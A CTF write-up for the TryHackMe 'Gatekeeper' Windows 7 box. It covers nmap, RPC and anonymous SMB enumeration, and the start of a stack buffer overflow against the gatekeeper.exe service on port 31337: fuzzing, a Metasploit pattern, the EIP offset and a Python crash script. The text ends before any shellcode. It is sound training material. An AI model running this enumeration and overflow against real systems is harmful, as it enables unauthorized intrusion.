# Gatekeeper from TryHackMe!

Write-up by Herman Detwiler

# Brief

*Can you get past the gate and through the fire?*

Deploy the machine when you are ready to release the Gatekeeper.

**Writeups will not be accepted for this challenge**

Defeat the Gatekeeper to break the chains.  But beware, fire awaits on the other side.

# Recon and Service enumeration


Was able to get system info, found RDP RPC and SMB running. There is also an unknown service running on port 31337

## Nmap scan

```bash
PORT      STATE SERVICE            REASON          VERSION
135/tcp   open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 125 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgro
up: WORKGROUP)                                           
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 125
31337/tcp open  Elite?             syn-ack ttl 125
49152/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49161/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49162/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
```


## RPC

Rpc gives me some useful infomation that I will put in my back pocket for now. For example was able to rpcdump

```
└─$ cat tcp_135_rpc_rpcdump.txt|grep Provider                                                                  1 ⨯
Provider: wininit.exe
Provider: winlogon.exe
Provider: sysntfy.dll
Provider: winlogon.exe
Provider: wscsvc.dll
Provider: dhcpcsvc6.dll
Provider: dhcpcsvc.dll
Provider: nrpsrv.dll
Provider: wevtsvc.dll
Provider: certprop.dll
Provider: srvsvc.dll
Provider: iphlpsvc.dll
Provider: IKEEXT.DLL
Provider: schedsvc.dll
Provider: taskcomp.dll
Provider: taskcomp.dll
Provider: schedsvc.dll
Provider: gpsvc.dll
Provider: N/A
Provider: nsisvc.dll
Provider: samsrv.dll
Provider: spoolsv.exe
Provider: spoolsv.exe
Provider: spoolsv.exe
Provider: MPSSVC.dll
Provider: MPSSVC.dll
Provider: BFE.DLL
Provider: sysmain.dll
Provider: pcasvc.dll
Provider: services.exe
Provider: spoolsv.exe
Provider: FwRemoteSvr.dll
Provider: ssdpsrv.dll
```

# SMB

Was able to get a wealth of information via SMB, including the system info, a the binary that is potentially running on port 31337,
and verify that I can upload files to the share (which is also the home NTUSER directory on the system)


OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)

```
Computer name: gatekeeper
|   NetBIOS computer name: GATEKEEPER\x00
|   Workgroup: WORKGROUP\x00 
```


Seems that I can access some files on over smb

using smbclient and cme



cme
```
└─$ sudo crackmapexec smb 10.10.22.17 -u 'Anonymous' -p ' ' --shares
SMB         10.10.22.17     445    GATEKEEPER       [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:GATEKEEPER) (domain:gatekeeper) (signing:False) (SMBv1:True)
SMB         10.10.22.17     445    GATEKEEPER       [+] gatekeeper\Anonymous:  
SMB         10.10.22.17     445    GATEKEEPER       [+] Enumerated shares
SMB         10.10.22.17     445    GATEKEEPER       Share           Permissions     Remark
SMB         10.10.22.17     445    GATEKEEPER       -----           -----------     ------
SMB         10.10.22.17     445    GATEKEEPER       ADMIN$                          Remote Admin
SMB         10.10.22.17     445    GATEKEEPER       C$                              Default share
SMB         10.10.22.17     445    GATEKEEPER       IPC$                            Remote IPC
SMB         10.10.22.17     445    GATEKEEPER       Users           READ            

```

smbclient


I grab the local files and a gatekeeper.exe binary, also find I can put files:

```
                7863807 blocks of size 4096. 3868248 blocks available
smb: \share\> put test.txt
putting file test.txt as \share\test.txt (0.0 kb/s) (average 0.0 kb/s)
smb: \share\> dir
  .                                   D        0  Sun Aug 21 11:17:14 2022
  ..                                  D        0  Sun Aug 21 11:17:14 2022
  gatekeeper.exe                      A    13312  Mon Apr 20 01:27:17 2020
  test.txt                            A       13  Sun Aug 21 11:17:14 2022

                7863807 blocks of size 4096. 3868248 blocks available
smb: \share\> 
```


# gatekeeper.exe


After grabbing gatekeeper.exe, my first step is running file and strings. From the strings command, it would seem this app is possibly hardcoded to run on port 31337.

*Also on a side-note it seems to be a rebuild of dostackbufferoverflowgood from the BOF_prep room*


```bash
└─$ strings gatekeeper.exe   

...
5ntel                                                                          
5Genu                                  
t#=`                                   
RSDSeF                                                                         
\\VBOXSVR\dostackbufferoverflowgood\dostackbufferoverflowgood\Release\dostackbufferoverflowgood.pdb
...
SetUnhandledExceptionFilter
GetStartupInfoW
IsProcessorFeaturePresent
GetModuleHandleW
GetCurrentProcess
TerminateProcess
KERNEL32.dll
WSAStartup failed: %d
31337
getaddrinfo failed: %d
socket() failed with error: %ld
bind() failed with error: %d
listen() failed with error: %ld
[+] Listening for connections.
accept failed: %d
Received connection from remote host.
Connection handed off to handler thread.
Please send shorter lines.
Bye!
[!] recvbuf exhausted. Giving up.
Client disconnected.
recv() failed: %d.
Bytes received: %d
exit
Client requested exit.
Hello %s!!!
send failed: %d
Bytes sent: %d
...

```

From here, I decide it would behoove me to create a virtual env with this OS and then build out an exploit locally.

However, only because I am aways on my laptop, I first want to try and see if I can just spin up OSCP_prep room.

If the OS is close, since it already has immunity and mona, I might just transfer gatekeeper there.

# Creating an exploit

Url for bof prep machine:https://tryhackme.com/room/bufferoverflowprep

(alt make your own VM)

After sending it over, I see that it prints a msg and counts the bytes I send. I will use this to create an exploit for the target.


## Finding the number of bytes it takes to crash the program.

This step is called fuzzing, I will send an increasing number bytes to this application with python, and then record when it crashes:

I find that when I send 1000 A's the system crashes. So I use metasploit to create a 1000 byte long non-repeating pattern.

```
/usr/bin/msf-pattern_create -l 1000|xclip -selection clipboard
```


I send this over with netcat an view the resaults in immunity:

I find the EIP offset at 146

![image](https://user-images.githubusercontent.com/83407557/185804854-39c58530-d554-4a69-aa8f-b82e476ccfd6.png)



This is the script I use the replicate the crash and see that I can put A's up to the offset of EIP, which I fill with B's then have ESP and beyond filled with C's

```
#!/usr/bin/env python2
# fuzzer.py

import socket
import sys

# setup the Target's IP and port.
RHOST = "10.10.218.237"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# The payload

padding = ""
offset = 146
overflow = "A" * offset
retn = "BBBB"
payload = "C" * (1000-146-4)

buffer = overflow + retn + padding + payload

# build message followed by a newline
buf = ""
buf += buffer
buf += "\n"
s.send(buf)
print "Sent: {0}".format(buf)
data = s.recv(1024)
print "Received: {0}".format(data)


```

